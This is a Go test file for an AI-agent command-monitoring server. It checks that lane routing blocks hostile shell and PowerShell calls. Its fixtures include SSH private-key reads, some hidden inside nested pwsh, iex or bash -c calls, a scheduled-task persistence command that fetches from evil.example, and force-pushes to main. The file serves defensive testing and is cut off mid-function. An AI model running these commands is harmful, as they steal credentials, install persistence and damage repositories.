package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/AI-AgentLens/agentshield/internal/analyzer"
	"github.com/AI-AgentLens/agentshield/internal/assembly"
	"github.com/AI-AgentLens/agentshield/internal/facts"
	"github.com/AI-AgentLens/agentshield/internal/policy"
	"github.com/AI-AgentLens/agentshield/internal/psreader"
	"github.com/AI-AgentLens/agentshield/internal/route"
)

// ADR-001 step 2: a request carrying the routing key goes through the hook's
// table, lanes and combiner (routing.go). Attack strings are assembled at
// runtime, as everywhere in this package.

// psKeyRead reads an SSH private key through the Windows profile variable:
// the shape the POSIX pipeline ALLOWs as a read-only command
// (ts-allow-readonly) and the PowerShell lane resolves to ~/.ssh.
func psKeyRead() string { return `type $env:USERPROFILE\` + `.ssh\` + "id_rsa" }

func withRoute(req evaluateRequest, harness, tool, goos string) evaluateRequest {
	req.Route = &routeKey{Harness: harness, Tool: tool, OS: goos}
	return req
}

func noteDetails(ns []analyzer.Note, kind string) []string {
	var out []string
	for _, n := range ns {
		if n.Kind == kind {
			out = append(out, n.Detail)
		}
	}
	return out
}

func mustPost(t *testing.T, ts *httptest.Server, req evaluateRequest) evaluateResponse {
	t.Helper()
	code, resp := postEval(t, ts, req)
	if code != http.StatusOK {
		t.Fatalf("status %d for %+v", code, req)
	}
	return resp
}

// TestRoutedRequest_ClaudeCodePowerShell: Claude Code's PowerShell tool is
// read by its row's lanes, MCP policy and the PowerShell lane, after the lane
// the client's request shape always took: POSIX for the PowerShell client's
// command, MCP policy for the Python client's tool call. Main's POSIX reading
// ALLOWs the key read; the PowerShell lane BLOCKs it, and the receipt says
// which lanes read it.
func TestRoutedRequest_ClaudeCodePowerShell(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	cmd := psKeyRead()

	old := mustPost(t, ts, evaluateRequest{Command: cmd, Cwd: `C:\repo`})
	if old.Decision == "BLOCK" {
		t.Fatalf("control: the unkeyed command decides %s %v; the POSIX reading was expected to miss it", old.Decision, old.Rules)
	}

	shapes := map[string]struct {
		req   evaluateRequest
		lanes string // the lane_readings prefix: the legacy lane first
	}{
		"PowerShell client (command)": {evaluateRequest{Command: cmd, Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": cmd}},
			"tool=PowerShell; posix=ALLOW(ts-allow-readonly); structured="},
		"Python client (tool call)": {evaluateRequest{ToolName: "PowerShell", Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": cmd}},
			"tool=PowerShell; structured="},
		"command without arguments": {evaluateRequest{Command: cmd, Cwd: `C:\repo`},
			"tool=PowerShell; posix=ALLOW(ts-allow-readonly); structured="},
	}
	for name, sh := range shapes {
		resp := mustPost(t, ts, withRoute(sh.req, "claude-code", "PowerShell", "windows"))
		if resp.Decision != "BLOCK" || !slices.Contains(resp.Rules, "protected-path") {
			t.Errorf("%s: %s %v, want BLOCK by protected-path", name, resp.Decision, resp.Rules)
		}
		lr := noteDetails(resp.Notes, analyzer.NoteLaneReadings)
		if len(lr) != 1 || !strings.HasPrefix(lr[0], sh.lanes) ||
			!strings.HasSuffix(lr[0], "; powershell=BLOCK(protected-path); kept=powershell") {
			t.Errorf("%s: lane_readings %q, want %q... then powershell kept", name, lr, sh.lanes)
		}
		if len(noteDetails(resp.Notes, analyzer.NoteDialect)) != 1 {
			t.Errorf("%s: notes %+v lack the dialect note of the kept PowerShell reading", name, resp.Notes)
		}
	}
}

// TestRoutedRequest_CopilotRows: Copilot's compatible-format Bash names no
// dialect, so on Windows the POSIX and PowerShell lanes both read it and on
// macOS POSIX alone does, exactly as without the key. The native powershell
// tool gets both on every OS.
func TestRoutedRequest_CopilotRows(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	cmd := psKeyRead()
	req := evaluateRequest{Command: cmd, Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": cmd}}
	unkeyed := mustPost(t, ts, evaluateRequest{Command: cmd, Cwd: `C:\repo`})

	for _, c := range []struct {
		harness, tool, goos string
		lanes               string // "" = single lane: the unkeyed verdict, no lane_readings note
	}{
		{"copilot-cli", "Bash", "windows", "posix=ALLOW(ts-allow-readonly); powershell=BLOCK(protected-path); kept=powershell"},
		{"copilot-cli", "Bash", "darwin", ""},
		{"copilot-cli-native", "powershell", "linux", "posix=ALLOW(ts-allow-readonly); powershell=BLOCK(protected-path); kept=powershell"},
		{"copilot-cli-native", "bash", "windows", ""},
		{"claude-code", "Bash", "windows", ""},
	} {
		resp := mustPost(t, ts, withRoute(req, c.harness, c.tool, c.goos))
		lr := noteDetails(resp.Notes, analyzer.NoteLaneReadings)
		if c.lanes == "" {
			if resp.Decision != unkeyed.Decision || !slices.Equal(resp.Rules, unkeyed.Rules) || len(lr) != 0 {
				t.Errorf("(%s, %s, %s): %s %v notes %q; want the unkeyed %s %v and no lane_readings", c.harness, c.tool, c.goos,
					resp.Decision, resp.Rules, lr, unkeyed.Decision, unkeyed.Rules)
			}
			continue
		}
		if resp.Decision != "BLOCK" || len(lr) != 1 || lr[0] != "tool="+c.tool+"; "+c.lanes {
			t.Errorf("(%s, %s, %s): %s lane_readings %q; want BLOCK and %q", c.harness, c.tool, c.goos, resp.Decision, lr, c.lanes)
		}
	}
}

// TestRoutedRequest_MonitorRow: Claude Code's Monitor runs its command as a
// shell script, so its row adds the POSIX lane after MCP policy (#4753). The
// Python client sends it as a tool call; with the key the shell pipeline
// reads it too.
func TestRoutedRequest_MonitorRow(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	req := evaluateRequest{ToolName: "Monitor", Arguments: map[string]interface{}{"command": destructiveCommand()}}

	unkeyed := mustPost(t, ts, req)
	if unkeyed.Decision == "BLOCK" {
		t.Fatalf("control: unkeyed Monitor decides BLOCK %v; this row would show no raise", unkeyed.Rules)
	}
	resp := mustPost(t, ts, withRoute(req, "claude-code", "Monitor", "linux"))
	lr := noteDetails(resp.Notes, analyzer.NoteLaneReadings)
	if resp.Decision != "BLOCK" || !slices.Contains(resp.Rules, "ts-block-rm-root") || len(lr) != 1 || !strings.HasSuffix(lr[0], "kept=posix") {
		t.Errorf("keyed Monitor: %s %v lane_readings %q; want the POSIX lane's BLOCK kept", resp.Decision, resp.Rules, lr)
	}
}

// TestRoutedRequest_RoutingGapNote: a tool no row names that carries command
// text is read by MCP policy, as without the key, and the receipt records the
// gap (D5). The note never changes the decision.
func TestRoutedRequest_RoutingGapNote(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	req := evaluateRequest{ToolName: "Shell", Arguments: map[string]interface{}{"command": destructiveCommand()}}
	unkeyed := mustPost(t, ts, req)
	resp := mustPost(t, ts, withRoute(req, "claude-code", "Shell", "linux"))
	if resp.Decision != unkeyed.Decision || !slices.Equal(resp.Rules, unkeyed.Rules) {
		t.Errorf("keyed %s %v, unkeyed %s %v: a gap must not change the decision", resp.Decision, resp.Rules, unkeyed.Decision, unkeyed.Rules)
	}
	if g := noteDetails(resp.Notes, analyzer.NoteRoutingGap); len(g) != 1 || !strings.Contains(g[0], `tool "Shell" (harness claude-code)`) {
		t.Errorf("routing_gap notes %q, want one naming the tool and harness", g)
	}
	if len(noteDetails(unkeyed.Notes, analyzer.NoteRoutingGap)) != 0 {
		t.Errorf("the unkeyed request carries a routing_gap note: %+v", unkeyed.Notes)
	}
}

// TestRoutedRequest_LegacyLaneFirst: a keyed request is read first by the
// lane its shape took without the key, so it never decides below its
// unkeyed twin, and where no other lane decides more strictly it keeps the
// unkeyed twin's record exactly (rules, taxonomy). The rows here are the
// ones whose table lanes differ from the client's: a tool the table names
// exactly but the PowerShell client matched in any letter case, a row the
// hook passes through, an unknown harness, a shell row with no command, and
// cross-platform CLI BLOCKs read through Claude Code's PowerShell row
// (#4766 Opus pass 1, F1: the PowerShell lane has no CLI rules).
func TestRoutedRequest_LegacyLaneFirst(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	cmd := func(c string) evaluateRequest {
		return evaluateRequest{Command: c, Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": c}}
	}
	toolReq := evaluateRequest{ToolName: "read_file", Arguments: map[string]interface{}{"path": credentialPath()}}
	bashToolNoCommand := evaluateRequest{ToolName: "Bash", Arguments: map[string]interface{}{"description": "x"}}
	forcePush := strings.Join([]string{"git", "push", "--force", "origin", "main"}, " ")

	rows := []struct {
		name  string
		req   evaluateRequest
		key   [3]string
		block bool // the unkeyed twin BLOCKs: the row could have lowered it
	}{
		{"Codex PowerShell as a command", cmd(schtasksShape()), [3]string{"codex", "PowerShell", "windows"}, true},
		{"Claude-shaped lower-case powershell as a command", cmd(schtasksShape()), [3]string{"claude-code", "powershell", "windows"}, true},
		{"native PowerShell (case) as a command", cmd(schtasksShape()), [3]string{"copilot-cli-native", "PowerShell", "windows"}, true},
		{"Claude Code PowerShell: a CLI force push", cmd(forcePush), [3]string{"claude-code", "PowerShell", "windows"}, true},
		{"Claude Code PowerShell: schtasks", cmd(schtasksShape()), [3]string{"claude-code", "PowerShell", "windows"}, true},
		{"unknown harness", toolReq, [3]string{"some-new-harness", "read_file", "linux"}, true},
		{"Gemini tool its hook is not registered for", toolReq, [3]string{"gemini-cli", "read_file", "linux"}, true},
		{"Cursor event the table passes", cmd(schtasksShape()), [3]string{"cursor", "afterFileEdit", "windows"}, true},
		{"Bash tool call with no command", bashToolNoCommand, [3]string{"claude-code", "Bash", "linux"}, true},
	}
	for _, r := range rows {
		plain := r.req
		if plain.Command != "" {
			plain.Arguments = nil
		}
		want := mustPost(t, ts, plain)
		if (want.Decision == "BLOCK") != r.block {
			t.Errorf("%s: control: the unkeyed twin decides %s %v", r.name, want.Decision, want.Rules)
		}
		got := mustPost(t, ts, withRoute(r.req, r.key[0], r.key[1], r.key[2]))
		if decisionRank[got.Decision] < decisionRank[want.Decision] {
			t.Errorf("%s: keyed %s %v, below the unkeyed %s %v", r.name, got.Decision, got.Rules, want.Decision, want.Rules)
		}
		if got.Decision == want.Decision && (!slices.Equal(got.Rules, want.Rules) || !slices.Equal(got.Taxonomy, want.Taxonomy)) {
			t.Errorf("%s: a tie must keep the unkeyed record: keyed %v %v, unkeyed %v %v", r.name, got.Rules, got.Taxonomy, want.Rules, want.Taxonomy)
		}
		if plain.Command != "" && len(noteDetails(got.Notes, analyzer.NoteRoutingGap)) != 0 {
			t.Errorf("%s: a routing_gap note on a command its legacy POSIX lane read: %+v", r.name, got.Notes)
		}
	}
}

// TestRoutedRequest_MalformedKey: a key that is incomplete, or a request that
// names the tool or the command twice, differently, is refused, never
// guessed: the lanes would read different calls.
func TestRoutedRequest_MalformedKey(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	rows := map[string]evaluateRequest{
		"no os":      withRoute(evaluateRequest{Command: "ls"}, "claude-code", "Bash", ""),
		"no harness": withRoute(evaluateRequest{Command: "ls"}, "", "Bash", "linux"),
		"no tool":    withRoute(evaluateRequest{Command: "ls"}, "claude-code", "", "linux"),
		"tool_name and route.tool differ": withRoute(evaluateRequest{ToolName: "Read", Arguments: map[string]interface{}{"file_path": "/x"}},
			"claude-code", "Bash", "linux"),
		"command and arguments.command differ": withRoute(evaluateRequest{Command: "ls", Arguments: map[string]interface{}{"command": "pwd"}},
			"claude-code", "Bash", "linux"),
		"arguments.command not a string": withRoute(evaluateRequest{Command: "ls", Arguments: map[string]interface{}{"command": 1}},
			"claude-code", "Bash", "linux"),
	}
	for name, req := range rows {
		if code, _ := postEval(t, ts, req); code != http.StatusBadRequest {
			t.Errorf("%s: status %d, want 400", name, code)
		}
	}
	// Control: the same key, well formed, is evaluated.
	if code, _ := postEval(t, ts, withRoute(evaluateRequest{Command: "ls", Arguments: map[string]interface{}{"command": "ls"}}, "claude-code", "Bash", "linux")); code != http.StatusOK {
		t.Errorf("well-formed key: status %d, want 200", code)
	}
}

// TestRoutedRequest_RecordShape: the server's own audit line is the kept
// reading's, as the hook records it: shell-shaped (the command, no tool name
// or arguments) when a shell lane is kept, a tool call when MCP policy is,
// with the lane_readings note either way. A keyed command whose legacy POSIX
// reading is kept records the command alone, as the unkeyed request did.
func TestRoutedRequest_RecordShape(t *testing.T) {
	logPath := filepath.Join(t.TempDir(), "audit.jsonl")
	srv, err := NewServer(Options{Version: "test", LogPath: logPath})
	if err != nil {
		t.Fatal(err)
	}
	defer srv.Close()
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()
	cmd := psKeyRead()

	mustPost(t, ts, withRoute(evaluateRequest{Command: cmd, Arguments: map[string]interface{}{"command": cmd}}, "claude-code", "PowerShell", "windows"))
	ev := lastAuditRecord(t, logPath)
	if ev["command"] != cmd || ev["tool_name"] != nil || ev["arguments"] != nil || ev["decision"] != "BLOCK" {
		t.Errorf("PowerShell lane kept: record %v; want shell-shaped, BLOCK", ev)
	}
	if !strings.Contains(mustJSON(t, ev["notes"]), analyzer.NoteLaneReadings) {
		t.Errorf("record notes %v lack lane_readings", ev["notes"])
	}

	mustPost(t, ts, withRoute(evaluateRequest{ToolName: "PowerShell", Arguments: map[string]interface{}{"command": "Get-Date"}}, "claude-code", "PowerShell", "windows"))
	ev = lastAuditRecord(t, logPath)
	if ev["tool_name"] != "PowerShell" || ev["command"] != "" || ev["arguments"] == nil {
		t.Errorf("MCP policy kept (tie): record %v; want a tool call", ev)
	}

	mustPost(t, ts, withRoute(evaluateRequest{Command: "Get-Date", Arguments: map[string]interface{}{"command": "Get-Date"}}, "codex", "PowerShell", "windows"))
	ev = lastAuditRecord(t, logPath)
	if ev["command"] != "Get-Date" || ev["arguments"] != nil {
		t.Errorf("keyed command, POSIX kept on a tie: record %v; want the command alone", ev)
	}
}

func mustJSON(t *testing.T, v interface{}) string {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// TestRoutedRequest_LaneFailure: a PowerShell lane that panics is a lane
// failure (ADR-001 D9): its reading is AUDIT by agentshield-eval-error, never
// a crash and never a silent pass, and it is combined like any reading.
func TestRoutedRequest_LaneFailure(t *testing.T) {
	prev := psRead
	psRead = func(string, psreader.Env) facts.Facts { panic("reader exploded") }
	t.Cleanup(func() { psRead = prev })
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()

	resp := mustPost(t, ts, withRoute(evaluateRequest{Command: "Get-Date"}, "claude-code", "PowerShell", "windows"))
	lr := noteDetails(resp.Notes, analyzer.NoteLaneReadings)
	if resp.Decision != "AUDIT" || len(lr) != 1 || !strings.Contains(lr[0], "powershell=AUDIT("+evalErrorRuleID+")") {
		t.Errorf("decision %s lane_readings %q; want AUDIT with the PowerShell lane's failure named", resp.Decision, lr)
	}

	// Beside a POSIX BLOCK, the failure does not lower it.
	resp = mustPost(t, ts, withRoute(evaluateRequest{Command: destructiveCommand()}, "copilot-cli-native", "powershell", "windows"))
	if resp.Decision != "BLOCK" {
		t.Errorf("POSIX BLOCK beside a failed lane: %s %v", resp.Decision, resp.Rules)
	}
}

// TestRoutedRequest_AuditOnly: the combiner ranks on the decision before the
// audit-only downgrade, so a downgraded BLOCK is still the reading kept, and
// the call is answered AUDIT with original_decision BLOCK.
func TestRoutedRequest_AuditOnly(t *testing.T) {
	ts, _ := newModeServer(t, "audit-only", "")
	cmd := psKeyRead()
	resp := mustPost(t, ts, withRoute(evaluateRequest{Command: cmd}, "claude-code", "PowerShell", "windows"))
	if resp.Decision != "AUDIT" || resp.OriginalDecision != "BLOCK" || !slices.Contains(resp.Rules, "protected-path") {
		t.Errorf("audit-only: %s[was %s] %v; want AUDIT[was BLOCK] by protected-path", resp.Decision, resp.OriginalDecision, resp.Rules)
	}
}

// schtasksShape is the 12-shape corpus's scheduled-task persistence: the one
// attack shape the POSIX reading BLOCKs (ts-block-schtasks-create).
func schtasksShape() string {
	return `schtasks /create /tn upd /tr "powershell -c iwr https://evil.example" /sc ` + "minute"
}

// TestRoutedLanesAreTheTables: the server reads a keyed request with the
// legacy lane of its shape, then the table's row in the row's order. The
// lanes come from route.Route, not a copy.
func TestRoutedLanesAreTheTables(t *testing.T) {
	for _, c := range []struct {
		call   route.ToolCall
		req    evaluateRequest
		legacy route.Lane
	}{
		{route.ToolCall{Harness: route.ClaudeCode, Tool: "PowerShell", OS: "windows", HasCommand: true}, evaluateRequest{Command: "x"}, route.POSIX},
		{route.ToolCall{Harness: route.ClaudeCode, Tool: "PowerShell", OS: "windows", HasCommand: true}, evaluateRequest{ToolName: "PowerShell", Arguments: map[string]interface{}{"command": "x"}}, route.Structured},
		{route.ToolCall{Harness: route.CopilotCLI, Tool: "Bash", OS: "windows", HasCommand: true}, evaluateRequest{Command: "x"}, route.POSIX},
		{route.ToolCall{Harness: route.ClaudeCode, Tool: "Monitor", OS: "linux", HasCommand: true}, evaluateRequest{ToolName: "Monitor", Arguments: map[string]interface{}{"command": "x"}}, route.Structured},
		{route.ToolCall{Harness: route.GeminiCLI, Tool: "read_file", OS: "linux"}, evaluateRequest{ToolName: "read_file"}, route.Structured},
	} {
		rc, err := routeRequest(withRoute(c.req, string(c.call.Harness), c.call.Tool, c.call.OS))
		if err != nil || rc == nil {
			t.Fatalf("%+v: routeRequest = %v, %v", c.call, rc, err)
		}
		want := []route.Lane{c.legacy}
		for _, l := range route.Route(c.call) {
			if l != c.legacy {
				want = append(want, l)
			}
		}
		if !slices.Equal(rc.lanes, want) {
			t.Errorf("%+v: lanes %v, want %v", c.call, rc.lanes, want)
		}
	}
}

// TestRoutedRequest_Concurrent: one engine serves every request, so a routed
// call's lanes (the PowerShell lane included) must read it without shared
// mutable state. Run under -race (docs/shield-server.md, Tests).
func TestRoutedRequest_Concurrent(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	reqs := []evaluateRequest{
		withRoute(evaluateRequest{Command: psKeyRead()}, "claude-code", "PowerShell", "windows"),
		withRoute(evaluateRequest{Command: schtasksShape()}, "copilot-cli-native", "powershell", "windows"),
		withRoute(evaluateRequest{Command: "Get-Date; bash -c 'ls'"}, "copilot-cli", "Bash", "windows"),
		withRoute(evaluateRequest{ToolName: "Monitor", Arguments: map[string]interface{}{"command": destructiveCommand()}}, "claude-code", "Monitor", "linux"),
	}
	want := make([]string, len(reqs))
	for i, r := range reqs {
		want[i] = mustPost(t, ts, r).Decision
	}
	var wg sync.WaitGroup
	errs := make(chan string, 64)
	for g := 0; g < 8; g++ {
		wg.Add(1)
		go func(g int) {
			defer wg.Done()
			for k := 0; k < 4; k++ {
				i := (g + k) % len(reqs)
				body, _ := json.Marshal(reqs[i])
				resp, err := http.Post(ts.URL+"/v1/evaluate", "application/json", strings.NewReader(string(body)))
				if err != nil {
					errs <- err.Error()
					return
				}
				var out evaluateResponse
				_ = json.NewDecoder(resp.Body).Decode(&out)
				_ = resp.Body.Close()
				if out.Decision != want[i] {
					errs <- fmt.Sprintf("request %d: %s concurrently, %s alone", i, out.Decision, want[i])
				}
			}
		}(g)
	}
	wg.Wait()
	close(errs)
	for e := range errs {
		t.Error(e)
	}
}

// TestRoutedRequest_NestedTextIsRead: on Claude Code's PowerShell row from
// the Python client (MCP policy, then the PowerShell lane: no POSIX lane
// reads the outer text), a key read that only a nested interpreter's text
// performs BLOCKs through the PowerShell lane's nested routing: pwsh -c and
// iex back into the PowerShell lane, bash -c into the server's POSIX
// reading. Control: the same key path only mentioned in a string decides
// AUDIT. Pins #4766 Opus pass 1's surviving mutants R10 (the nesting bound
// set to 0) and R16 (a nested POSIX reading replaced by a constant AUDIT).
func TestRoutedRequest_NestedTextIsRead(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	key := "~/" + ".ssh/" + "id_rsa"
	call := func(text string) evaluateResponse {
		return mustPost(t, ts, withRoute(evaluateRequest{ToolName: "PowerShell", Cwd: `C:\repo`,
			Arguments: map[string]interface{}{"command": text}}, "claude-code", "PowerShell", "windows"))
	}
	if r := call("Write-Output 'Get-Content " + key + "'"); r.Decision == "BLOCK" {
		t.Fatalf("control: a mention decides BLOCK %v; the nested rows would prove nothing", r.Rules)
	}
	for name, text := range map[string]string{
		"pwsh -c":    "pwsh -c 'Get-Content " + key + "'",
		"iex":        "iex 'Get-Content " + key + "'",
		"bash -c":    "bash -c 'cat " + key + "'",
		"cmd → pwsh": "cmd /c powershell -c Get-Content " + key,
	} {
		r := call(text)
		if r.Decision != "BLOCK" {
			t.Errorf("%s: %s %v notes %+v; want the nested text's BLOCK", name, r.Decision, r.Rules, r.Notes)
		}
	}
}

// TestRoutedRequest_NestedBoundIsTheServers (#4766 Opus pass 1, F2): the
// server's PowerShell lane reads at most assembly.ServerNestedPOSIXBound
// distinct nested sh texts a call, for its clients' 5 s timeout. A
// destructive `bash -c` after 1100 of them is past the bound, so the lane's
// own reading floors at AUDIT with the parse_error note. The calls still
// decide no lower than main:
//   - from the PowerShell client the legacy POSIX lane reads the outer text,
//     and the call BLOCKs, as main did;
//   - from the Python client main's path (MCP policy) read no nested text,
//     and that lane still reads the call.
//
// The hook sets no bound (TestPowerShellLane_HookReadsEveryNestedText).
func TestRoutedRequest_NestedBoundIsTheServers(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	var b strings.Builder
	for i := 0; i < 1100; i++ {
		fmt.Fprintf(&b, "sh -c a%d; ", i)
	}
	b.WriteString("bash -c '" + destructiveCommand() + "'")
	text := b.String()
	if assembly.ServerNestedPOSIXBound >= 1100 {
		t.Fatalf("the bound (%d) no longer sits below this text's 1100 nested texts", assembly.ServerNestedPOSIXBound)
	}

	// The server's lane, as routing builds it: capped, AUDIT, the note.
	r, err := sharedServer.powerShellLane(`C:\repo`).Read(text)
	if err != nil {
		t.Fatal(err)
	}
	capped := false
	for _, n := range r.Notes {
		capped = capped || (n.Kind == "parse_error" && strings.Contains(n.Detail, "distinct nested bash/sh texts"))
	}
	if r.Decision != "AUDIT" || !capped {
		t.Errorf("server lane: %s %v notes %+v; want AUDIT with the bound's parse_error note", r.Decision, r.TriggeredRules, r.Notes)
	}
	// Control: below the bound the same nested text is read and BLOCKs.
	if r, _ := sharedServer.powerShellLane(`C:\repo`).Read("sh -c a0; bash -c '" + destructiveCommand() + "'"); r.Decision != "BLOCK" {
		t.Errorf("control: below the bound the nested text decides %s, want BLOCK", r.Decision)
	}

	for name, c := range map[string]struct{ old, keyed evaluateRequest }{
		"PowerShell client": {evaluateRequest{Command: text},
			withRoute(evaluateRequest{Command: text, Arguments: map[string]interface{}{"command": text}}, "claude-code", "PowerShell", "windows")},
		"Python client": {evaluateRequest{ToolName: "PowerShell", Arguments: map[string]interface{}{"command": text}},
			withRoute(evaluateRequest{ToolName: "PowerShell", Arguments: map[string]interface{}{"command": text}}, "claude-code", "PowerShell", "windows")},
	} {
		old, keyed := mustPost(t, ts, c.old), mustPost(t, ts, c.keyed)
		if decisionRank[keyed.Decision] < decisionRank[old.Decision] {
			t.Errorf("%s: keyed %s, below main's path %s", name, keyed.Decision, old.Decision)
		}
		if lr := noteDetails(keyed.Notes, analyzer.NoteLaneReadings); len(lr) != 1 || !strings.Contains(lr[0], "powershell=AUDIT") {
			t.Errorf("%s: lane_readings %q; want the PowerShell lane's capped AUDIT", name, lr)
		}
		if name == "PowerShell client" && keyed.Decision != "BLOCK" {
			t.Errorf("PowerShell client: %s %v; want BLOCK through the legacy POSIX lane", keyed.Decision, keyed.Rules)
		}
	}
}

// TestServerNestedBound_CountsTextsNotBytes_AcceptedGapC1 pins an ACCEPTED
// GAP (#4766 Opus pass 2, C1; accepted by Gary 2026-11-04), as
// TN-SSHKEY-VARSHELL-002 pins its own: it asserts today's behaviour, so
// closing the gap has to change this test on purpose.
//
// The server's bound on nested bash/sh texts (assembly.ServerNestedPOSIXBound,
// 1024) counts distinct texts, not bytes. Fewer than 1024 long texts are all
// read, each a full POSIX pipeline run: about 120 KiB of them (1000 texts of
// 30 statements) took a call from main's 0.12 s (Python client) and 2.13 s
// (PowerShell client) to 2.19 s and 4.4 s, and under 8 or 4 concurrent
// clients every call passed the thin client's 5 s timeout and failed open
// where main BLOCKed. A byte budget (256 texts and 8 KiB) closes it and is
// kept on branch feat/4245-server-nested-byte-bound (2b37f9ba).
func TestServerNestedBound_CountsTextsNotBytes_AcceptedGapC1(t *testing.T) {
	const n = 300
	if assembly.ServerNestedPOSIXBound <= n {
		t.Fatalf("the count bound (%d) is no longer above %d texts: the gap this test pins has changed", assembly.ServerNestedPOSIXBound, n)
	}
	var b strings.Builder
	for i := 0; i < n; i++ {
		var p []string
		for j := 0; j < 30; j++ {
			p = append(p, fmt.Sprintf("a%d", j))
		}
		fmt.Fprintf(&b, "sh -c '%s;x%d'; ", strings.Join(p, ";"), i)
	}
	b.WriteString("bash -c '" + destructiveCommand() + ";" + strings.Repeat("b;", 300) + "'")

	l := sharedServer.powerShellLane(`C:\work`)
	read, bytes := 0, 0
	posix := l.POSIX
	l.POSIX = func(text string) policy.EvalResult {
		read++
		bytes += len(text)
		return posix(text)
	}
	r, err := l.Read(b.String())
	if err != nil {
		t.Fatal(err)
	}
	if read != n+1 || bytes < 32<<10 {
		t.Errorf("the server read %d nested texts, %d bytes; the accepted gap is that it reads all %d (%d+ KiB)", read, bytes, n+1, 32)
	}
	for _, note := range r.Notes {
		if note.Kind == "parse_error" {
			t.Errorf("a bound note on %d long texts: %+v (has a byte bound landed? then update this test and the ADR)", n, note)
		}
	}
	if r.Decision != "BLOCK" {
		t.Errorf("the last nested text decides %s, want BLOCK: every text is read", r.Decision)
	}
}

// bridgeGitForce and bridgeGitForceWindows force-push main: plainly, and in
// the spelling only the native-command bridge reads (the call operator, a
// quoted Windows path, .exe). Assembled at run time.
func bridgeGitForce() string { return "git push " + "--force origin main" }
func bridgeGitForceWindows() string {
	return `& 'C:\Program Files\Git\bin\git.exe' push ` + "--force origin main"
}

// TestRoutedRequest_NativeBridge (#4768): the native-command bridge runs on a
// routed call whose lanes have no POSIX lane, the Python client's Claude Code
// PowerShell call (Structured, PowerShell), and its BLOCK carries the bash
// rule. The PowerShell client's call keeps its legacy POSIX reading first, so
// the bridge does not run there: the spelling only the bridge reads decides
// AUDIT on it (POSIX reads the raw text as bash), BLOCK through the Python
// client. Control: the Python client's request without the key (main's path,
// MCP policy) does not BLOCK.
func TestRoutedRequest_NativeBridge(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	py := func(cmd string) evaluateRequest {
		return evaluateRequest{ToolName: "PowerShell", Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": cmd}}
	}
	pwshClient := func(cmd string) evaluateRequest {
		return evaluateRequest{Command: cmd, Cwd: `C:\repo`, Arguments: map[string]interface{}{"command": cmd}}
	}
	const rule = "ts-block-git-force-push-main"

	if r := mustPost(t, ts, py(bridgeGitForce())); r.Decision == "BLOCK" {
		t.Fatalf("control: the unkeyed tool call decides %s %v; MCP policy was expected to miss it", r.Decision, r.Rules)
	}
	for _, cmd := range []string{bridgeGitForce(), bridgeGitForceWindows()} {
		r := mustPost(t, ts, withRoute(py(cmd), "claude-code", "PowerShell", "windows"))
		lr := noteDetails(r.Notes, analyzer.NoteLaneReadings)
		if r.Decision != "BLOCK" || !slices.Equal(r.Rules, []string{rule}) || len(lr) != 1 ||
			!strings.HasSuffix(lr[0], "; powershell=BLOCK("+rule+"); kept=powershell") {
			t.Errorf("Python client %q: %s %v %q; want BLOCK by %s, kept from the PowerShell lane", cmd, r.Decision, r.Rules, lr, rule)
		}
	}
	// The PowerShell client: POSIX reads the plain spelling (and keeps its
	// record on the tie); the Windows spelling is AUDIT, because the bridge
	// does not run beside POSIX.
	if r := mustPost(t, ts, withRoute(pwshClient(bridgeGitForce()), "claude-code", "PowerShell", "windows")); r.Decision != "BLOCK" || !slices.Contains(r.Rules, rule) {
		t.Errorf("PowerShell client, plain: %s %v; want POSIX's BLOCK", r.Decision, r.Rules)
	}
	if r := mustPost(t, ts, withRoute(pwshClient(bridgeGitForceWindows()), "claude-code", "PowerShell", "windows")); r.Decision != "AUDIT" {
		t.Errorf("PowerShell client, Windows spelling: %s %v; want AUDIT (no bridge beside POSIX)", r.Decision, r.Rules)
	}
}

// TestRoutedRequest_NativeBridgeIsBoundedOnTheServer: shield-server reads at
// most ServerNativeBridgeBytes of the bridge's rebuilt text, for its thin
// clients' 5 s timeout; past it a line is not read and a parse_error note
// floors the call at AUDIT, which is where main's reading of the Python
// client's call stops. Control: the same lane with no bound (the hook's)
// reads the last line and BLOCKs.
func TestRoutedRequest_NativeBridgeIsBoundedOnTheServer(t *testing.T) {
	ts := httptest.NewServer(sharedServer.Handler())
	defer ts.Close()
	text := strings.Repeat("git status; ", assembly.ServerNativeBridgeBytes/11+100) + bridgeGitForce()

	r := mustPost(t, ts, withRoute(evaluateRequest{ToolName: "PowerShell", Cwd: `C:\repo`,
		Arguments: map[string]interface{}{"command": text}}, "claude-code", "PowerShell", "windows"))
	if r.Decision != "AUDIT" {
		t.Errorf("server: %s %v; want AUDIT", r.Decision, r.Rules)
	}
	// The kept record on that tie is MCP policy's (D4); the lane's own
	// reading carries the bound's note.
	l := sharedServer.powerShellLane(`C:\repo`)
	l.NativeBridge = true
	res, err := l.Read(text)
	bounded := false
	for _, n := range res.Notes {
		bounded = bounded || n.Kind == string(facts.NoteParseError) && strings.Contains(n.Detail, "native-command bridge")
	}
	if err != nil || res.Decision != policy.DecisionAudit || !bounded || l.NativeBridgeBytes != assembly.ServerNativeBridgeBytes {
